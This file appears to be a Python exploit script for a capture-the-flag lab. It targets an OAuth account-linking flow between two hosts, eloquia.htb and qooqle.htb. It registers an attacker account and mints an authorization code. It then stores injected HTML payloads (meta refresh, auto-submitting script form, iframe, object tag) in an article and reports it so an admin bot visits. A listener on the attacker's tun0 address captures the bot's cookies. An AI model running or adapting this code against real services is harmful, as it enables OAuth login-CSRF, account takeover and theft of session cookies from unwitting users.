#!/usr/bin/env python3
"""
Test if auto-submitting form preserves cookies better than meta refresh.
"""
import requests
import re
import time
import random
import string
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from io import BytesIO

TARGET_ELOQUIA = "http://eloquia.htb"
TARGET_QOOQLE = "http://qooqle.htb"
CLIENT_ID = "riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi"
REDIRECT_URI = "http://eloquia.htb/accounts/oauth2/qooqle/callback/"

# Load credentials
with open("/home/kali/lab-mixed/tmp/username.txt") as f:
    USERNAME = f.read().strip()
with open("/home/kali/lab-mixed/tmp/password.txt") as f:
    PASSWORD = f.read().strip()

def get_csrf(html):
    match = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', html)
    return match.group(1) if match else None

def create_banner():
    """Create >20KB image"""
    from PIL import Image
    img = Image.new('RGB', (800, 600))
    for i in range(800):
        for j in range(600):
            img.putpixel((i, j), (random.randint(0,255), random.randint(0,255), random.randint(0,255)))
    buf = BytesIO()
    img.save(buf, 'PNG')
    buf.seek(0)
    return buf

# Capture server
captured_requests = []
bot_visit_event = threading.Event()

class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args): pass
    
    def do_GET(self):
        cookies = self.headers.get('Cookie', 'NONE')
        ua = self.headers.get('User-Agent', '')
        is_bot = 'HeadlessChrome' in ua
        
        captured_requests.append({
            'path': self.path,
            'cookies': cookies,
            'is_bot': is_bot,
            'ua': ua[:50]
        })
        
        if is_bot:
            print(f"\n[BOT] Path: {self.path}")
            print(f"[BOT] Cookies: {cookies}")
            bot_visit_event.set()
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'OK')

# Start server
import subprocess
tun0_ip = subprocess.check_output(['ip', 'addr', 'show', 'tun0']).decode()
for line in tun0_ip.split('\n'):
    if 'inet ' in line:
        callback_ip = line.split()[1].split('/')[0]
        break

print(f"[*] Using callback IP: {callback_ip}")

server = HTTPServer(('0.0.0.0', 8889), Handler)
thread = threading.Thread(target=server.serve_forever, daemon=True)
thread.start()
print("[*] Server listening on port 8889")

# Login to Eloquia
eloquia = requests.Session()
login_page = eloquia.get(f"{TARGET_ELOQUIA}/accounts/login/")
csrf = get_csrf(login_page.text)
eloquia.post(f"{TARGET_ELOQUIA}/accounts/login/",
    data={'csrfmiddlewaretoken': csrf, 'username': USERNAME, 'password': PASSWORD},
    headers={'Referer': f"{TARGET_ELOQUIA}/accounts/login/"})

if 'sessionid' not in eloquia.cookies:
    print("[-] Login failed")
    exit(1)
print(f"[+] Logged in as {USERNAME}")

# Create attack account
attack_suffix = ''.join(random.choices(string.ascii_lowercase, k=4))
attack_user = f"frm{attack_suffix}"
attack_pass = f"Form{random.randint(1000,9999)}!"

qooqle = requests.Session()
reg_page = qooqle.get(f"{TARGET_QOOQLE}/register/")
csrf = get_csrf(reg_page.text)
qooqle.post(f"{TARGET_QOOQLE}/register/",
    data={'csrfmiddlewaretoken': csrf, 'first_name': 'Form', 'last_name': 'Test',
          'username': attack_user, 'password1': attack_pass, 'password2': attack_pass},
    headers={'Referer': f"{TARGET_QOOQLE}/register/"})

login_page = qooqle.get(f"{TARGET_QOOQLE}/login/")
csrf = get_csrf(login_page.text)
qooqle.post(f"{TARGET_QOOQLE}/login/",
    data={'csrfmiddlewaretoken': csrf, 'username': attack_user, 'password': attack_pass},
    headers={'Referer': f"{TARGET_QOOQLE}/login/"})

if 'sessionid' not in qooqle.cookies:
    print("[-] Qooqle login failed")
    exit(1)
print(f"[+] Attack account: {attack_user}")

# Get OAuth code
auth_url = f"{TARGET_QOOQLE}/oauth2/authorize/?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}"
auth_page = qooqle.get(auth_url)
csrf = get_csrf(auth_page.text)
resp = qooqle.post(auth_url,
    data={'csrfmiddlewaretoken': csrf, 'redirect_uri': REDIRECT_URI, 'scope': 'read write',
          'client_id': CLIENT_ID, 'response_type': 'code', 'allow': 'Authorize'},
    headers={'Referer': auth_url}, allow_redirects=False)

location = resp.headers.get('Location', '')
code_match = re.search(r'code=([^&\s]+)', location)
if not code_match:
    print("[-] No OAuth code")
    exit(1)
oauth_code = code_match.group(1)
print(f"[+] OAuth code: {oauth_code[:16]}...")

# Test different payloads
callback_url = f"{REDIRECT_URI}?code={oauth_code}"
capture_url = f"http://{callback_ip}:8889/capture"
timestamp = str(int(time.time()))

# Method 1: meta refresh (original - doesn't work)
payload_meta = f'''<meta http-equiv="refresh" content="0;url={callback_url}"><p>Meta refresh test.</p>'''

# Method 2: Auto-submitting form (GET method)
# Note: This requires JavaScript which is sanitized
payload_form_js = f'''<form id="f" action="{REDIRECT_URI}" method="GET">
<input type="hidden" name="code" value="{oauth_code}">
</form>
<script>document.getElementById('f').submit();</script>
<p>Form test with JS.</p>'''

# Method 3: noscript fallback with meta
payload_noscript = f'''<noscript>
<meta http-equiv="refresh" content="0;url={callback_url}">
</noscript>
<script>window.location='{callback_url}';</script>
<p>Noscript fallback test.</p>'''

# Method 4: iframe (might be blocked by X-Frame-Options)
payload_iframe = f'''<iframe src="{callback_url}" style="display:none"></iframe>
<p>Iframe test.</p>'''

# Method 5: Link that looks like main content (bot might click it?)
payload_link = f'''<a href="{callback_url}" style="font-size:24px;display:block;text-align:center;padding:50px">
Click here to continue reading
</a>
<meta http-equiv="refresh" content="1;url={callback_url}">
<p>Link test.</p>'''

# Method 6: Object tag
payload_object = f'''<object data="{callback_url}" type="text/html" width="100%" height="100%"></object>
<meta http-equiv="refresh" content="1;url={callback_url}">
<p>Object test.</p>'''

# Method 7: Two-stage - first to our server to see cookies, then redirect
payload_two_stage = f'''<meta http-equiv="refresh" content="0;url={capture_url}?next={callback_url}">
<p>Two-stage test.</p>'''

# Test: First let's just verify the bot visits and what cookies it has
print("\n[*] Creating article with two-stage redirect to capture bot cookies...")

my_articles = eloquia.get(f"{TARGET_ELOQUIA}/article/mine/")
existing_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))

create_page = eloquia.get(f"{TARGET_ELOQUIA}/article/create/")
csrf = get_csrf(create_page.text)

# Use payload that redirects to our server first
resp = eloquia.post(f"{TARGET_ELOQUIA}/article/create/",
    data={'csrfmiddlewaretoken': csrf, 'title': f"Test {timestamp}", 'content': payload_two_stage},
    files={'banner': ('banner.png', create_banner(), 'image/png')},
    headers={'Referer': f"{TARGET_ELOQUIA}/article/create/"}, timeout=60)

article_id = None
match = re.search(r'article/visit/(\d+)', resp.url + resp.text)
if match:
    article_id = match.group(1)
else:
    my_articles = eloquia.get(f"{TARGET_ELOQUIA}/article/mine/")
    new_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))
    created = new_ids - existing_ids
    if created:
        article_id = max(created)

if not article_id:
    print("[-] Failed to create article")
    # Check for error
    if 'please check your input' in resp.text.lower():
        print("[-] ERROR: please check your input")
    exit(1)

print(f"[+] Article created: ID {article_id}")

# Report it
eloquia.get(f"{TARGET_ELOQUIA}/article/report/{article_id}/")
print(f"[+] Article reported")
print(f"\n[*] Waiting for bot (up to 5 min)...")

# Wait for bot
start = time.time()
while not bot_visit_event.is_set():
    elapsed = int(time.time() - start)
    print(f"\r    Waiting: {elapsed}s", end='', flush=True)
    if elapsed > 300:
        print("\n[-] Timeout")
        break
    time.sleep(1)

print("\n\n[*] Captured requests:")
for req in captured_requests:
    print(f"  {req}")

server.shutdown()
